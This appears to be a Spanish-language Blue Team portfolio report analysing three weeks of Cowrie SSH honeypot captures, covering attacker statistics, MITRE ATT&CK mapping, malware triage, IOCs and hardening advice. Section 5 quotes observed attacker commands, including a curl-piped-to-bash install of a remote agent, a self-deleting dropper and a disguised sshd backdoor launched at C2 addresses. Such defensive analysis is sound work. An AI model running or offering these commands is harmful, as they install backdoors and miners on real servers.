# Informe de Análisis de Amenazas — Honeypot SSH Cowrie

**Clasificación:** Uso educativo / Portafolio
**Autor:** Hans Soto — Analista SOC en formación (Blue Team)
**Tipo de sistema:** Honeypot SSH de media interacción (Cowrie 3.0.1)
**Período de captura:** ~3 semanas
**Fecha del informe:** 22 de junio de 2026
**Formato de referencia:** NIST SP 800-61r2 (Computer Security Incident Handling)

---

## 1. Resumen ejecutivo

Se desplegó un honeypot SSH (Cowrie) en un servidor cloud con dirección IP pública,
con el objetivo de capturar y analizar actividad maliciosa real proveniente de
internet. En aproximadamente 3 semanas de exposición, el sensor registró cerca de
**60.000 conexiones** desde más de **950 direcciones IP únicas** distribuidas en
decenas de países, con un volumen masivo de comandos ejecutados y **más de 260
descargas de malware**.

El análisis identificó al menos **tres campañas de ataque diferenciadas**, operando
simultáneamente:

1. **Cryptojacking** — minería de Monero mediante el criptominero RedTail (para
   dispositivos ARM) y un lanzador directo de XMRig.
2. **Propagación de botnet** — un módulo en Python que convierte cada víctima en un
   nodo que escanea e infecta otros servidores SSH.
3. **Acceso persistente** — múltiples backdoors SSH que abusan del subsistema de
   autenticación PAM y se comunican con servidores C2.

Adicionalmente se observó el abuso de **Komari**, una herramienta legítima de
monitoreo, empleada como puerta trasera con ejecución remota de comandos.

Mediante triaje con VirusTotal se identificó un hallazgo crítico: **el componente
más activo de la campaña es detectado por solo 3 de 75 motores antivirus**, lo que
demuestra el valor de la detección por comportamiento (honeypot) frente a la
detección por firma.

---

## 2. Objetivo y alcance

**Objetivo.** Construir un sensor de amenazas funcional, capturar ataques reales,
y demostrar capacidad de análisis e interpretación de la actividad maliciosa
con marco MITRE ATT&CK y enriquecimiento de threat intelligence.

**Alcance.**
- Captura de conexiones, autenticación, comandos y archivos descargados.
- Análisis estático (sin ejecución) de las muestras capturadas.
- Triaje de malware con VirusTotal y correlación con MITRE ATT&CK.
- Visualización en dashboard con enriquecimiento de IOCs.

**Fuera de alcance.** Ingeniería inversa profunda de binarios en sandbox dedicado;
atribución de actor; respuesta activa (bloqueo/denuncia).

---

## 3. Arquitectura del entorno de captura

```
Atacantes (internet)
    │  puerto 22 (IP pública)
    ▼
[ Servidor cloud — Ubuntu 24.04 ]
    │  iptables redirige 22 → 2223
    ▼
[ Cowrie 3.0.1 ]  honeypot SSH de media interacción (systemd, 24/7)
    │  registro estructurado en JSON
    ▼
[ Pipeline automatizado ]  cron cada 5 min → import_cowrie → SQLite
    │
    ▼
[ Dashboard Django ]  estadísticas · geolocalización · forense · VirusTotal
```

**Medidas de seguridad del entorno.**
- Honeypot ejecutado bajo usuario sin privilegios.
- Acceso administrativo separado en puerto no estándar (2222).
- Doble capa de firewall (perimetral del proveedor + iptables local).
- Servidor desechable y aislado, sin datos sensibles.
- Muestras de malware mantenidas en cuarentena, sin permisos de ejecución.

> Cowrie es un honeypot de **media interacción**: emula un sistema Linux y permite
> al atacante "entrar" y ejecutar comandos en un entorno controlado, sin acceso
> real al host. Esto permite observar el comportamiento post-acceso sin riesgo.

---

## 4. Estadísticas de la actividad capturada

### 4.1 Volumen general (~3 semanas)
| Métrica | Valor aproximado |
|---------|------------------|
| Conexiones totales | ~59.900 |
| IPs únicas | ~950 |
| Logins exitosos | ~57.300 |
| Logins fallidos | ~270 |
| Descargas de malware | ~263 |
| Países de origen | Decenas |

> Cowrie acepta casi cualquier credencial por diseño, de ahí la alta proporción de
> "logins exitosos". El honeypot no rechaza: engaña para observar el comportamiento.

### 4.2 Distribución geográfica
Los orígenes predominantes son Estados Unidos, China y Países Bajos, seguidos de
Reino Unido, Corea del Sur, Singapur, Vietnam, Alemania, Francia y muchos más. El
mapa mundial del dashboard muestra atacantes en los cinco continentes.

**Interpretación.** El predominio de ciertos países NO implica que los atacantes
residan allí: refleja dónde se alquila infraestructura cloud y dónde hay servidores
comprometidos. Es consistente con la telemetría pública de honeypots.

### 4.3 Patrón de credenciales
Las contraseñas más frecuentes incluyen cadenas como `LeitboGi0ro`, `123@@@` y
`smo@@kkklss`, que **no son credenciales humanas** sino cadenas hardcodeadas en
familias de malware. Su alta frecuencia confirma que el tráfico está dominado por
**botnets automatizadas**, no por intentos manuales.

El usuario más atacado es `root` por amplio margen, seguido de `admin` — patrón
clásico de bots que buscan privilegio máximo inmediato.

---

## 5. Análisis de comandos post-acceso

Una vez "dentro", los atacantes ejecutaron secuencias de comandos que revelan sus
objetivos, agrupadas en cuatro fases:

### Fase 1 — Reconocimiento
```
uname -s -v -n -r -m
```
Identificación de kernel y arquitectura para elegir el payload adecuado.
→ **T1082 — System Information Discovery**

### Fase 2 — Preparación del entorno
```
command -v python3 || (apt-get install -y python3)
command -v curl || (apt-get install -y curl)
```
Instalación de dependencias para maximizar compatibilidad.
→ **T1059 — Command and Scripting Interpreter**

### Fase 3 — Descarga y ejecución de payloads
```
bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/.../install...)
python3 /tmp/bendi.py
rm /tmp/bendi.py
```
Descarga del agente Komari desde GitHub y de un dropper Python que se autoelimina.
→ **T1105 — Ingress Tool Transfer** · **T1070.004 — Indicator Removal**

### Fase 4 — Persistencia y backdoor
```
chmod +x ./.<oculto>/sshd ; nohup ./.<oculto>/sshd <IP_C2> <IP_C2> ...
```
Ejecución de un binario disfrazado de `sshd`, en carpeta oculta, con `nohup` y
apuntando a IPs C2 hardcodeadas.
→ **T1036.005 — Masquerading** · **T1564.001 — Hidden Files** · **T1071 — C2**

---

## 6. Análisis de muestras y triaje de malware

Se analizaron 5 muestras representativas mediante análisis estático (sin ejecución)
y triaje con VirusTotal y Joe Sandbox. El detalle completo está en el **Anexo A —
Análisis de Malware**. Resumen:

| Muestra | Tipo | Detección VT | Conclusión |
|---------|------|--------------|------------|
| `00b374d5...` | Script Python | **3/75** | Propagación de botnet (poco detectado) |
| `3625d068...` | ELF ARM (UPX) | 30/74 | RedTail — criptominero Monero |
| `c5f499dc...` | Script | No conocido | Lanzador XMRig (cryptojacking) |
| `626d05b3...` | ELF x86-64 | 38/75 | Backdoor SSH (abuso de PAM) |
| `94f2e4d8...` | ELF Go | **47/75** | discord-exploit (Discord como C2) |

**Hallazgo crítico.** La muestra más descargada (`00b374d5...`, 124 veces) es
detectada por solo 3 de 75 motores. El componente más activo de la campaña pasa
casi indetectado por antivirus de firma — validando el rol del honeypot como
detección por comportamiento.

---

## 7. Indicadores de Compromiso (IOCs)

> Para uso defensivo. El detalle completo de hashes está en el Anexo A.

### IPs de origen de descargas (muestra)
```
134.185.104.148 · 120.48.116.64 · 158.51.96.38
168.156.171.11 · 138.2.98.41 · 168.107.26.33
```

### IPs C2 (del backdoor)
```
106.225.235.203 · 203.186.60.25
```

### Cryptojacking
```
Wallet Monero:  86xZwGVyGx54zxxpiEXVwJ5tX5xZJKNAd7E21q9rtz1fMUoLWmWU7Bx6crJ8xaa2WAN75Z2Fukgi6WSAVcYL1wJZE4c31x6
Pool:           auto.skypool.org:6666
```

### Canal C2 abusado
```
discord.com  (discord-exploit — MITRE T1102)
```

### Artefactos en disco
```
/root/.s/                 directorio oculto del escáner
/root/.s/ssh_scanner.py   componente de propagación
scan-runner.service       servicio systemd de persistencia
/tmp/bendi.py             dropper (autoeliminado)
```

### Credenciales firma de campaña
```
LeitboGi0ro · 123@@@ · smo@@kkklss
```

---

## 8. Resumen de técnicas MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|-----|
| Initial Access | Brute Force | T1110 |
| Initial Access | Valid Accounts | T1078 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Network Service Discovery | T1046 |
| Execution | Command and Scripting Interpreter | T1059 |
| Command & Control | Ingress Tool Transfer | T1105 |
| Command & Control | Application Layer Protocol | T1071 |
| Command & Control | Web Service (Discord) | T1102 |
| Command & Control | Non-Standard Port | T1571 |
| Defense Evasion | Masquerading (Legitimate Name) | T1036.005 |
| Defense Evasion | Hidden Files and Directories | T1564.001 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Defense Evasion | Software Packing (UPX) | T1027.002 |
| Credential Access | Modify Authentication Process (PAM) | T1556 |
| Persistence | Create/Modify System Process (systemd) | T1543.002 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Impact | Resource Hijacking (cryptojacking) | T1496 |

---

## 9. Conclusiones

1. **La exposición a internet genera ataques en minutos.** Un servidor SSH con IP
   pública es escaneado y atacado de inmediato por botnets automatizadas, a un ritmo
   de miles de sesiones por día.

2. **El tráfico está dominado por bots, no humanos.** Las credenciales hardcodeadas
   y la repetición exacta de secuencias de comandos confirman automatización masiva.

3. **Se capturaron campañas completas y simultáneas**: cryptojacking, propagación de
   botnet y backdoors persistentes, cada una con su cadena de ataque completa.

4. **El malware más activo evade los antivirus tradicionales** (3/75 detecciones),
   lo que valida la detección por comportamiento que ofrece un honeypot.

5. **Valor defensivo.** Los IOCs extraídos (IPs, hashes, wallets, artefactos,
   credenciales) son insumo directo para reglas de detección y listas de bloqueo.

---

## 10. Recomendaciones defensivas

Derivadas de las técnicas observadas, aplicables a cualquier servidor SSH expuesto:

- **Deshabilitar login SSH de `root`** (`PermitRootLogin no`).
- **Usar autenticación por clave pública**, no contraseñas.
- **Cambiar SSH a un puerto no estándar** para reducir ruido de escaneo.
- **Implementar fail2ban** para bloquear IPs tras intentos fallidos.
- **Monitorear creación de servicios systemd y directorios ocultos** en `/root`.
- **Vigilar procesos `sshd` anómalos** (rutas no estándar, argumentos con IPs).
- **Alimentar los IOCs** a firewalls/SIEM para detección proactiva.

---

## 11. Trabajo futuro

- Ingeniería inversa de los binarios en sandbox aislado para confirmar funcionalidad.
- Correlación de las IPs con fuentes de threat intel (AbuseIPDB, GreyNoise).
- Captura extendida para análisis de tendencias a largo plazo.
- Alertas automáticas ante umbrales de actividad inusual.

---

## Anexos

- **Anexo A — Análisis de Malware** (`ANEXO_ANALISIS_MALWARE.md`): detalle de las 5
  muestras, triaje VirusTotal completo y fuentes de threat intelligence.

---

*Documento elaborado como parte de un portafolio de ciberseguridad (Blue Team / SOC).
Los datos provienen de un honeypot propio en entorno controlado y aislado.*
